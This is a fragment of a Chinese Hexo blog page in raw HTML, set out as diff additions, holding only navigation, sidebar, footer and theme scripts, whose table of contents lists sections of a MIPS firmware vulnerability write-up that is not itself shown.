href="#address-already-in-use"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text"> Address already in use</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E7%9A%84mipsrop%E6%8F%92%E4%BB%B6"><span class="toc-number">1.1.4.</span> <span class="toc-text"> IDA的mipsrop插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98nameerror-name-mipsrop-is-not-defined"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 常见问题：NameError: name ‘mipsrop’ is not defined</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 常使用模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text"> 知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 基础溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rop"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text"> HTTP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%A1%8C"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text"> 请求行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E6%8A%A5%E5%A4%B4"><span class="toc-number">1.2.2.0.2.</span> <span class="toc-text"> 消息报头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%AD%A3%E6%96%87"><span class="toc-number">1.2.2.0.3.</span> <span class="toc-text"> 请求正文</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mips%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.3.</span> <span class="toc-text"> MIPS架构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 基础汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#load%E5%92%8Cstore"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text"> LOAD和STORE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.3.2.2.</span> <span class="toc-text"> 指令格式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#r%E5%9E%8B"><span class="toc-number">1.2.3.2.2.1.</span> <span class="toc-text"> R型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#i%E5%9E%8B"><span class="toc-number">1.2.3.2.2.2.</span> <span class="toc-text"> I型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#j%E5%9E%8B"><span class="toc-number">1.2.3.2.2.3.</span> <span class="toc-text"> J型</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.3.2.3.</span> <span class="toc-text"> 常见汇编</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%8C%87%E4%BB%A4%E9%9B%86%E7%89%B9%E6%80%A7%E4%B9%8B%E4%B8%80%E5%88%86%E6%94%AF%E5%BB%B6%E8%BF%9F%E6%95%88%E5%BA%94"><span class="toc-number">1.2.3.3.</span> <span class="toc-text"> 流水线指令集特性之一：分支延迟效应</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.</span> <span class="toc-text"> 硬件下载地址：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text"> 漏洞成因：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text"> 漏洞分析：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text"> 动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E4%BB%BF%E7%9C%9F"><span class="toc-number">4.1.</span> <span class="toc-text"> 启动仿真</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%BA%A2%E5%87%BA%E5%A4%A7%E5%B0%8F"><span class="toc-number">4.2.</span> <span class="toc-text"> 测试溢出大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget%E6%80%9D%E8%B7%AF"><span class="toc-number">4.3.</span> <span class="toc-text"> gadget思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.4.</span> <span class="toc-text"> exp</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> 前置条件：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text"> 工具：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binwalk"><span class="toc-number">1.1.1.</span> <span class="toc-text"> binwalk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firmware-mod-kit"><span class="toc-number">1.1.2.</span> <span class="toc-text"> firmware-mod-kit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firmae"><span class="toc-number">1.1.3.</span> <span class="toc-text"> FirmAE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#downloadsh"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text"> download.sh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#installsh"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text"> install.sh</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BB%BF%E7%9C%9F%E5%B8%B8%E8%A7%81%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 使用仿真常见小问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#target-is-busy"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text"> target is busy.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#address-already-in-use"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text"> Address already in use</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E7%9A%84mipsrop%E6%8F%92%E4%BB%B6"><span class="toc-number">1.1.4.</span> <span class="toc-text"> IDA的mipsrop插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98nameerror-name-mipsrop-is-not-defined"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 常见问题：NameError: name ‘mipsrop’ is not defined</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 常使用模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text"> 知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 基础溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rop"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text"> HTTP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%A1%8C"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text"> 请求行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E6%8A%A5%E5%A4%B4"><span class="toc-number">1.2.2.0.2.</span> <span class="toc-text"> 消息报头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%AD%A3%E6%96%87"><span class="toc-number">1.2.2.0.3.</span> <span class="toc-text"> 请求正文</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mips%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.3.</span> <span class="toc-text"> MIPS架构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 基础汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#load%E5%92%8Cstore"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text"> LOAD和STORE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.3.2.2.</span> <span class="toc-text"> 指令格式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#r%E5%9E%8B"><span class="toc-number">1.2.3.2.2.1.</span> <span class="toc-text"> R型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#i%E5%9E%8B"><span class="toc-number">1.2.3.2.2.2.</span> <span class="toc-text"> I型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#j%E5%9E%8B"><span class="toc-number">1.2.3.2.2.3.</span> <span class="toc-text"> J型</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.3.2.3.</span> <span class="toc-text"> 常见汇编</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%8C%87%E4%BB%A4%E9%9B%86%E7%89%B9%E6%80%A7%E4%B9%8B%E4%B8%80%E5%88%86%E6%94%AF%E5%BB%B6%E8%BF%9F%E6%95%88%E5%BA%94"><span class="toc-number">1.2.3.3.</span> <span class="toc-text"> 流水线指令集特性之一：分支延迟效应</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.</span> <span class="toc-text"> 硬件下载地址：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text"> 漏洞成因：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text"> 漏洞分析：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text"> 动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E4%BB%BF%E7%9C%9F"><span class="toc-number">4.1.</span> <span class="toc-text"> 启动仿真</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%BA%A2%E5%87%BA%E5%A4%A7%E5%B0%8F"><span class="toc-number">4.2.</span> <span class="toc-text"> 测试溢出大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget%E6%80%9D%E8%B7%AF"><span class="toc-number">4.3.</span> <span class="toc-text"> gadget思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.4.</span> <span class="toc-text"> exp</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
